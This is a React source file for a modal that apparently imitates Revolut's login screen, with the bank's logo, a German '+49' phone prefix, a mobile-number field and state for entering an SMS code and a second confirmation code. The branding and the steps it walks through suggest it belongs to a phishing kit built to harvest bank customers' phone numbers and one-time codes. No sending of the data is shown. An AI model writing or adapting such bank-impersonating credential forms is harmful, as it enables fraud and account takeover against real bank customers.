import React, { useState } from 'react';
import styled from 'styled-components';

import { ReactComponent as REVOLUTSVG } from '../../../assets/svg/banks/revolut.svg';
import { ReactComponent as CloseSVG } from './close_modal.svg';
import { ReactComponent as ArrowSVG } from './arrow_svg.svg';
import { LOADER } from './LOADER';

export const P_REVOLUT = ({ children }) => {
  const [isOpen, setOpen] = useState(false);
  const [isConfirm, setConfirm] = useState(false);
  const [data, setData] = useState({
    data1: '',
  });

  const [isCodeConfirmed, setCodeConfirmed] = useState(false);
  const [isLogged, setLogged] = useState(false);
  const [isLoaded, setLoaded] = useState(false);

  const [smsInput, setSmsInput] = useState('');
  const [codeInput, setCodeInput] = useState('');

  const handleFinish = () => {
    setLoaded(false);
    setLogged(false);
    handleClose();
  };

  const handleLog = () => {
    setLoaded(false);
    setLogged(true);
    setSmsInput('');
  };

  const handleCode = () => {
    setLoaded(false);
    setCodeInput('');
    setCodeConfirmed(true);
  };

  const handleCodeInput = (e) => {
    setCodeInput(e.target.value);
  };

  const handleInput = (e) => {
    setSmsInput(e.target.value);
  };

  const isDisabled = data.data1 === '' || data.data2 === '';

  const handleData_1 = (e) => {
    setData({ data1: e.target.value });
  };

  const handleConfirm = () => {
    setConfirm(true);
  };

  const handleLoaderClose = () => {
    setOpen(false);
    setConfirm(false);
  };

  const handleOpen = () => {
    !isOpen && setOpen(true);
  };

  const handleClose = () => {
    setOpen(false);
  };

  return (
    <div onClick={handleOpen}>
      {children}
      <Dialog open={isOpen}>
        <div>
          <CONT>
            <D1>
              <D_TITLE>
                <REVOLUTSVG className="title" />
              </D_TITLE>
              <CloseSVG viewBox="8 8 33 32" onClick={handleClose} src="close_modal.png" className="close" />
            </D1>
            <LOADER
              Title={WARN}
              Input={INPUT}
              isConfirm={isConfirm}
              Button={BUTTON_HANDLER}
              loaderColor="#090909"
              isRevolut
              isCodeConfirmed={isCodeConfirmed}
              isLogged={isLogged}
              isLoaded={isLoaded}
              smsInput={smsInput}
              codeInput={codeInput}
              handleFinish={handleFinish}
              handleLog={handleLog}
              handleCode={handleCode}
              handleCodeInput={handleCodeInput}
              handleInput={handleInput}
              setLoaded={setLoaded}
            >
              <WARN>Log in to Revolut</WARN>
              <WARN_2>Enter your registered mobile number to log in.</WARN_2>
              <INPUTS>
                <ArrowSVG />
                <p>Country</p>
                <INPUT value="+49" readOnly style={{ color: 'black', paddingTop: 24 }} />
                <INPUT onChange={handleData_1} value={data.data1} placeholder="Mobile number" />
              </INPUTS>
              <BUTTON>
                <BUTTON_HANDLER onClick={handleConfirm} disabled={isDisabled}>
                  Confirm
                </BUTTON_HANDLER>
              </BUTTON>
            </LOADER>
          </CONT>
        </div>
      </Dialog>
    </div>
  );
};

const INPUTS = styled.div`
  display: grid;
  grid-template-columns: 200px 1fr;
  grid-gap: 24px;

  &::placeholder {
    color: gray;
  }

  & p {
    margin-left: 16px;
    color: gray;
    position: absolute;
    font-size: 14px;
    margin-top: 8px;
  }

  & svg {
    position: absolute;
    width: 24px;
    height: 24px;
    margin-top: 18px;
    margin-left: 164px;
    path {
      fill: gray;
    }
  }
`;

const INPUT = styled.input`
  background-color: #dfdfdf;
  padding: 8px 16px 8px 16px;
  border-radius: 12px;
  box-shadow: none;
  font-size: 18px;
  outline: none;
  height: 60px;
  border: none;
`;

const WARN_2 = styled.div`
  margin-bottom: 40px;
  text-align: center;
  font-size: 18px;
  color: gray;
`;

const WARN = styled.div`
  margin-top: 24px;
  font-size: 24px;
  font-weight: bold;
  margin-bottom: 12px;
  text-align: center;
`;

const BUTTON_HANDLER = styled.button`
  background-color: rgb(6, 102, 235);
  border: 1px solid rgb(6, 102, 235);
  box-shadow: rgb(6 102 235 / 12%) 0px 0.7rem 1.3rem 0px, rgb(6 102 235 / 24%) 0px 1rem 2.2rem 0px;
  padding: 12px 10px 10px 8px;
  border-radius: 12px;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  color: #ffffff;
  transition: all 0.3s;
  width: 50%;
  height: 56px;
  &:hover {
    background-color: rgb(6, 100, 230);
    box-shadow: none;
  }
  &:disabled {
    border-top: none !important;
    border-left: none !important;
    border-right: none !important;
    border-bottom: none !important;
    background: #666666;
    border: none;
    opacity: none;
    box-shadow: none;
  }
`;

const BUTTON = styled.div`
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;

  margin-top: 250px;

  & p {
    color: #333333;
    font-size: 18px;
  }
`;

const Dialog = styled.dialog`
  position: absolute;
  top: 0;
  & > div {
    position: fixed;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 999;
  }
`;

const D1 = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;

  & div {
    display: flex;
    justify-content: center;
    width: 100%;
  }

  & .title {
    height: 35px;
  }

  & .close {
    width: 24px;
    height: 24px;

    fill: darkgray;

    &:hover {
      cursor: pointer;
    }
  }
`;

const D_TITLE = styled.div`
  display: flex;
  justify-content: center;
  margin-left: 32px;

  & svg {
    fill: black;
  }
`;

const CONT = styled.div`
  background-color: #f2f2f2;
  border: 1px solid rgb(51, 51, 51);
  width: 600px;
  border-radius: 10px;
  padding: 24px 14px 24px 14px;
  text-align: left;
`;
